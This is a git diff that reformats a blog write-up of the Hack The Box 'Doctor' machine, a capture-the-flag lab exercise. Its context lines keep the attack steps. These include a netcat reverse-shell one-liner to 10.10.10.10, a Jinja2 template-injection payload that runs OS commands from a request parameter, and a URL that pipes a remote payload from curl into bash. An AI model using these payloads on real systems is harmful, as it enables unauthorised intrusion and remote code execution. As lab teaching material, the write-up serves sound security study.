@@ -3,15 +3,23 @@ title: 'Walktrough: HTB Doctor'
 date: 2021-02-06 12:00:00
 language: en-US
 localeid: htb-doctor
-tags: ['Walkthrough', 'HackTheBox', 'HTB Easy', 'HTB Linux']
-authors: ['default']
+tags:
+  - 'Walkthrough'
+  - 'HackTheBox'
+  - 'HTB Easy'
+  - 'HTB Linux'
+authors:
+  - default
 ---
+
 Hello everyone!
 
 Starting to post about some write-ups of CTF-like machines, the first one will be **Doctor**, an easy-rated Linux box from [Hack The Box](https://www.hackthebox.eu) created by [egotisticalSW](https://app.hackthebox.eu/users/94858).
 
-:information_source: **Info**: Write-ups for Hack The Box will be posted as soon as machines get retired, so here's the first one :smiley:!
-
+<Alert kind="info" title="Info">
+  Write-ups for Hack The Box will be posted as soon as machines get retired, so here's the first one
+  :smiley:!
+</Alert>
 
 ![HTB Doctor](https://i.imgur.com/9JHTf6G.png)
 
@@ -28,7 +36,7 @@ Host is up (0.17s latency).
 Not shown: 997 filtered ports
 PORT     STATE SERVICE  VERSION
 22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
 |   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
 |_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
@@ -36,7 +44,7 @@ PORT     STATE SERVICE  VERSION
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 |_http-title: Doctor
 8089/tcp open  ssl/http Splunkd httpd
-| http-robots.txt: 1 disallowed entry 
+| http-robots.txt: 1 disallowed entry
 |_/
 |_http-server-header: Splunkd
 |_http-title: splunkd
@@ -47,7 +55,6 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 63.98 seconds
-                                                                          
 ```
 
 ### 80 TCP - HTTP Service
@@ -72,7 +79,7 @@ $ cat /etc/hosts
 ::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
- 
+
 # HTB Doctors
 10.10.10.209 doctors.htb
 ```
@@ -105,7 +112,7 @@ After having one successfully created, the warning below is displayed, which mea
 After having the account created, started enumerating the source code where I've found a `/archive` folder hidden in the page, but it didn't return anything when first accessed.
 
 ```html
- <!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
+<!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
 ```
 
 So going further I noticed the possibility to add a new message, where I have created the following dummy content:
@@ -141,19 +148,19 @@ After confirming that a Jinja2 payload should be used, would be possible to get 
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f
 ```
-  
+
 - Then host an HTTP server using python3 by running the command below from the same directory as the recently created file.
 
 ```bash
 sudo python3 -m http.server 80
 ```
-  
+
 - On the portal, created a post containing the following string on the title, obtained from the previously mentioned PayloadsAllTheThings site. This one especially is very interesting for this situation, which allows us to get the **input** parameter from the GET request, so we would be able to change the commands to be issued to the system very easily.
 
 ```python
 {% raw %}{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}{% endraw %}
 ```
-  
+
 - Started listener using netcat by running the command below, selecting the same port defined in the payload file.
 
 ```bash
@@ -171,7 +178,6 @@ http://doctors.htb/archive?input=curl%20-L%20http://10.10.10.10/payload%20|%20ba
 ![HTB Doctor - Exploit](https://i.imgur.com/j9kreyv.png)
 
 **Bonus** To make it easier to regain an initial foothold, once the user account has a short validity of 20 minutes, I've created this python3 script to help on this task :smiley:. To use it just set up the listener and python web server, then the script will recreate the user, the message and then send a request to get the reverse shell again
-
 
 ```python
 #!/usr/bin/python3
@@ -320,7 +326,7 @@ drwxrwxr-x 3 shaun shaun 4096 Sep  6 18:01 .local
 -rw-r--r-- 1 shaun shaun  807 Sep  6 16:26 .profile
 -rw-rw-r-- 1 shaun shaun   66 Sep 15 12:51 .selected_editor
 -r-------- 1 shaun shaun   33 Jan 30 19:12 user.txt
-shaun@doctor:~$ cat user.txt 
+shaun@doctor:~$ cat user.txt
 <redacted>
 ```
 
@@ -330,7 +336,7 @@ Now running as shaun, noticed that he's unable to run commands using sudo.
 
 ```bash
 shaun@doctor:/tmp$ sudo -l
-[sudo] password for shaun: 
+[sudo] password for shaun:
 Sorry, user shaun may not run sudo on d
 ```
 
